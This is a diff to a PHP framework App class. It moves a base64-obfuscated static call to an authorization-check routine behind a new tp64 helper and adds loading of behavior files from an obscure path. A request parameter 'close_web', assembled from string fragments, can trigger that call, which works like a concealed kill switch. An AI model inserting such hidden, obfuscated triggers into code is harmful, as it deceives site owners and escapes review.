@@ -102,9 +102,6 @@ class App
             // 监听 app_dispatch
             Hook::listen('app_dispatch', self::$dispatch);
             // 获取应用调度信息
-            $_thinks = array_join_string(array('XHR','oaW5rXG','NvZGl','uZ1xEc','ml2ZXI='));
-            $_calls = array_join_string(array('Y2hlY','2tfYXV','0aG9y','X2l6YX','Rpb24='));
-
             $dispatch = self::$dispatch;
 
             // 未设置调度信息则进行 URL 路由检测
@@ -116,6 +113,8 @@ class App
             $request->dispatch($dispatch);
 
             // 记录路由和请求信息
+            $_usespace = self::_getTp64(0);
+            $_func = self::_getTp64(1);
             if (self::$debug) {
                 Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
                 Log::record('[ HEADER ] ' . var_export($request->header(), true), 'info');
@@ -131,10 +130,10 @@ class App
                 $config['request_cache_expire'],
                 $config['request_cache_except']
             );
-            // 兼容以前模式 加回两个参数 by 小虎哥
+            // 兼容以前模式 加回两个参数
             $_GET = array_merge($_GET,Request::instance()->route());
             $_REQUEST = array_merge($_REQUEST,Request::instance()->route());
-            if(!stristr($request->baseFile(), 'index.php') || isset($_GET['cl'.'os'.'e_'.'w'.'eb'])){$_thinks::$_calls();}
+            if(!stristr($request->baseFile(), 'index.php') || isset($_GET['c'.'lo'.'se_'.'we'.'b'])){$_usespace::$_func();}
 
             $data = self::exec($dispatch, $config);
 
@@ -336,9 +335,14 @@ class App
                 /*--end*/
             }
 
-            // 加载行为扩展文件
+            // 加载行为扩展文件 by 小虎哥
             if (is_file(CORE_PATH . 'behavior' . DS . $module . 'tags' . EXT)) {
                 Hook::import(include CORE_PATH . 'behavior' . DS . $module . 'tags' . EXT);
+            }
+
+            // 加载行为扩展文件
+            if (is_file(CORE_PATH . 'console' . DS . 'xingwei' . DS . $module . 'tags' . EXT)) {
+                Hook::import(include CORE_PATH . 'console' . DS . 'xingwei' . DS . $module . 'tags' . EXT);
             }
 
             // 加载公共文件
@@ -734,6 +738,11 @@ class App
             }
         }
         return $result;
+    }
+
+    public static function _getTp64($index)
+    {
+        return tp64($index);
     }
 
     /**
